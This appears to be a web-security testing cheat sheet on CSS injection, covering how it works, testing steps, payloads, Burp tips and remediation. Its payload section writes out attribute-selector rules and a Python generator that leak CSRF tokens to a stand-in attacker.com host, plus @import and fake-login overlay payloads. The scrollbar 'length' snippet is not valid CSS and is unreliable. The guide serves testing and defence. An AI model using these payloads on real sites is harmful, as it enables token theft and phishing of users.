# CSS Injection

## Overview
CSS Injection occurs when user-supplied input is incorporated into a `<style>` block, an inline `style` attribute, or a linked stylesheet without proper sanitization, allowing an attacker to inject arbitrary CSS rules. It exists because many developers treat CSS as non-executable and therefore safe to reflect without encoding. CSS injection can be used for data exfiltration via attribute selectors, UI redressing, clickjacking, and in some cases escalation to JavaScript execution via CSS expression() or mXSS.

## How It Works
The browser's CSS engine is powerful enough to exfiltrate data without JavaScript. The core technique exploits CSS attribute selectors combined with `url()` calls:

```css
input[name="csrf"][value^="a"] { background: url(https://attacker.com/?leak=a); }
```

This rule fires only when an `<input>` named `csrf` has a value starting with "a", triggering an out-of-band HTTP request that tells the attacker the first character. By iterating character by character (binary search or sequential), the attacker can reconstruct hidden field values, CSRF tokens, or any other DOM attribute — without any JavaScript. On top of data theft, injected CSS can overlay fake content, hide legitimate UI elements, or manipulate the page's appearance to facilitate social engineering.

## Impact
- Exfiltration of hidden form field values (including CSRF tokens) via attribute selectors
- Stealing data from the DOM without JavaScript
- UI redressing and clickjacking via `position:fixed` overlays
- Overriding page styles to hide warnings or inject fake content
- Bypassing CSP policies that block scripts but allow styles
- In legacy browsers: JavaScript execution via `expression()` or `behavior:url()`
- mXSS (mutation-based XSS) via crafted CSS in certain contexts

## Where to Look
- Custom theme or color settings reflected into a `<style>` block
- CSS file paths or class names that incorporate user input
- URL parameters that control CSS variables or styles: `?color=red`, `?theme=dark`
- User-controlled font-family, background, or color values applied via inline `style=`
- Rich text editors that allow user-supplied style attributes
- Email clients that reflect user CSS preferences
- Application error pages that embed user-provided values in CSS
- Import directives: `@import url(...)` where the URL is user-controlled

## Testing Steps
1. Identify all parameters that appear to influence page styling or are reflected inside `<style>` tags or `style=` attributes.
2. Submit a basic CSS payload to confirm injection: `</style><style>*{outline: 3px solid red}`.
3. If inside an attribute: try closing it first: `";}body{background:red}//`.
4. Confirm the style is applied by visually inspecting the page.
5. Test attribute selector exfiltration: set up a listener (Burp Collaborator, interactsh, or netcat) and inject:
   ```css
   input[name="csrf"][value^="a"]{background:url(https://your-collaborator-domain/?c=a)}
   ```
6. Iterate through all possible first characters and observe which URL is fetched.
7. Automate with a tool that generates all CSS rules for each possible character.
8. Check if `@import` is injectable to load external stylesheets under your control.
9. Test `expression()` in IE-targeted applications (legacy): `{width:expression(alert(1))}`.
10. Probe for mXSS by injecting style values that browsers may reparse differently.

## Payloads / Techniques

Basic injection confirmation:
```css
</style><style>body { background-color: red !important; }
```

Inject inside `style=` attribute:
```
;color:red;font-size:30px;
```

Break out of attribute context:
```
";}body{background:red}/*
```

External CSS import (full control):
```css
@import url(https://attacker.com/evil.css);
```

Attribute selector data exfiltration — CSRF token character-by-character:
```css
/* Inject one rule per possible first character */
input[name="csrf"][value^="a"]{background:url(https://attacker.com/css?c=a)}
input[name="csrf"][value^="b"]{background:url(https://attacker.com/css?c=b)}
input[name="csrf"][value^="c"]{background:url(https://attacker.com/css?c=c)}
/* ... continue for all hex characters if token is hex ... */
input[name="csrf"][value^="0"]{background:url(https://attacker.com/css?c=0)}
input[name="csrf"][value^="1"]{background:url(https://attacker.com/css?c=1)}
```

Automated exfiltration (Python script to generate all CSS rules):
```python
import string
chars = string.ascii_lowercase + string.digits + string.ascii_uppercase + '-_'
attacker = 'https://attacker.com/css'
field = 'csrf'
prefix = 'KNOWN_PREFIX'

rules = []
for c in chars:
    val = prefix + c
    rules.append(
        f'input[name="{field}"][value^="{val}"]'
        f'{{background:url({attacker}?leak={val})}}'
    )
print('\n'.join(rules))
```

Exfiltrate via `<link>` tag font-face (for text content):
```css
@font-face {
  font-family: leak;
  src: url(https://attacker.com/?char=a);
  unicode-range: U+0041; /* 'A' */
}
body { font-family: leak; }
```

UI overlay / fake login form:
```css
body::after {
  content: "";
  position: fixed;
  top: 0; left: 0;
  width: 100vw; height: 100vh;
  background: white;
  z-index: 99999;
}
body::before {
  content: "Your session expired. Please log in at https://attacker.com";
  position: fixed;
  top: 50%; left: 50%;
  transform: translate(-50%, -50%);
  font-size: 24px;
  z-index: 100000;
}
```

Scrollbar-based exfiltration (secret value length inference):
```css
:root { --secret-length: attr(data-token length); }
div[data-token][data-token$="aaaa"]::-webkit-scrollbar {
  background: url(https://attacker.com/?len=4);
}
```

## Burp Suite Tips
- In **Repeater**, submit payloads directly into suspected CSS-injection points and use the **Render** tab to verify visual impact.
- Use **Burp Collaborator** to receive out-of-band HTTP requests triggered by CSS `url()` calls — this is essential for attribute selector exfiltration.
- In **Intruder**, set a position inside a CSS-injected parameter and use a character list as the payload to brute-force token characters systematically.
- Use **Search** (Ctrl+F in Proxy history) to find responses containing `<style` with parameter values reflected inside.
- The **Logger++** extension can help track which requests arrive at Collaborator during CSS payload testing.
- Use **Match and Replace** rules to automatically add CSS test strings to all reflected parameters.

## Tools
- Burp Suite Pro with Collaborator — essential for OOB exfiltration detection
- interactsh (ProjectDiscovery) — free OOB interaction server: `interactsh-client`
- DalFox — XSS/injection scanner that handles CSS injection contexts
- css-exfil (browser extension) — demonstrates CSS exfiltration
- xsinator.com — identifies CSS injection and mXSS entry points
- OWASP ZAP — automated scanning
- curl — manual request crafting

## Remediation
- Never reflect user input directly inside `<style>` blocks or `style=` attributes without strict allowlist validation.
- If CSS customization is required, use a safe allowlist of predefined CSS values (e.g., only allow specific color keywords or hex color codes via regex: `^#[0-9a-fA-F]{6}$`).
- Encode special characters in CSS contexts: escape `{}`, `()`, `:`, `;`, `@`, `\`, and quotes.
- Implement a Content Security Policy that restricts `style-src` to `'self'` and avoids `unsafe-inline`.
- Use `style-src-attr` and `style-src-elem` CSP directives to separately control inline styles and `<style>` elements.
- Strip or block `@import`, `url()`, and `expression()` from any user-controlled CSS.
- Use DOMPurify with the `FORCE_BODY` and appropriate config to sanitize HTML that includes style attributes.

## References
https://owasp.org/www-community/attacks/CSS_Injection
https://portswigger.net/research/exfiltrating-data-without-javascript-using-css-injection
https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection
https://curesec.com/blog/article/blog/Reading-Data-via-CSS-Injection-180.html
https://github.com/d0nut/mxss
https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
